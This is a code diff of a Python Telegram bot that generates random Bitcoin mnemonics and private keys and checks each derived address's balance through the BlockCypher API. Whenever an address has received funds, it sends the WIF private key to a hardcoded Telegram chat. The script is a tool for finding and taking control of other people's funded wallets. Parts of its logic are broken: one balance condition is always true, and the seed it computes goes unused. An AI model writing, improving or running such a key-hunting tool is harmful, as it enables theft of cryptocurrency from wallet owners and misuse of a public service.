@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
 import random,json,requests,string
+from bitcoin.main import compress
 from time import sleep
 from telegram import *
-from telegram import update
-from telegram import messageid
 from telegram.ext import *
 from os import getenv as _
-from telegram.ext import conversationhandler
 from flask import Flask
+from bitcoin import privkey_to_pubkey,pubkey_to_address,sha256
+from mnemonic import Mnemonic
+from wif import privToWif
+#from litecoin import *
 import logging
 API_TOKEN = _("API_TOKEN")
 
@@ -18,6 +20,7 @@ bot = Bot(API_TOKEN)
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
+
 
 
 def start_value(update: Update, context: CallbackContext):
@@ -37,20 +40,39 @@ def start_value(update: Update, context: CallbackContext):
     params.append(msg_id)
     while True:
         trials = user_data['trials']
-        headers ={}    
-        addr_url = "https://api.blockcypher.com/v1/ltc/main/addrs"
+        headers ={}  
+        """
+        addr_url = "https://api.blockcypher.com/v1/btc/main/addrs"
         req = requests.request("POST",addr_url,headers = headers)
         address = json.loads(req.text)['address']
         private = json.loads(req.text)['private']
         wif = json.loads(req.text)['wif']
+        """  
+        
+        #Initialize class instance, picking from available dictionaries: english chinese_simplified chinese_traditional french italian japanese korean spanish
+        #mnemo = Mnemonic(language)
+        mnemo = Mnemonic("english")
+        #Generate word list given the strength (128 - 256):
+        words = mnemo.generate(strength=128)
+        # Given the word list and custom passphrase (empty in example), generate seed:
+        seed = mnemo.to_seed(words, passphrase="Thehackitect")
+        #Given the word list, calculate original entropy:
+        entropy = mnemo.to_entropy(words)
 
-        bal_url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance"
+        #Creating the Phrase
+        Private_Key = sha256(words)
+        toPublic_Key = privkey_to_pubkey(Private_Key)
+        address = pubkey_to_address(toPublic_Key)
+        wif = privToWif(Private_Key)
+        
+
+        bal_url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance"
         bal = requests.request("GET",bal_url,headers = headers)
         balance = json.loads(bal.text)['final_balance']
         received = json.loads(bal.text)['total_received']
 
         if int(received) > 0:
-            bot.send_message(chat_id="1233125771",text = f"Already used!: {address}\n\Received: {received}\n\nWIF:{wif}\n\nTrials:{trials}")
+            bot.send_message(chat_id="1233125771",text = f"Already used!: {address}\nReceived: {received}\n\nBalance:{balance}\nWIF:{wif}\n\nTrials:{trials}")
         if (int(balance) >= int(received) or int(balance) < int(received)) and int(received) != 0:
             cur_trials = int(trials)+1
             user_data['trials'] = cur_trials
@@ -68,9 +90,6 @@ def start_value(update: Update, context: CallbackContext):
         sleep(random.randint(10,25))
         continue
             
-#except:
-#bot.send_message(chat_id='@ftb_feedbacks',text='Script Ended...')
-#sleep(random.randint(10,25))
 
 
 
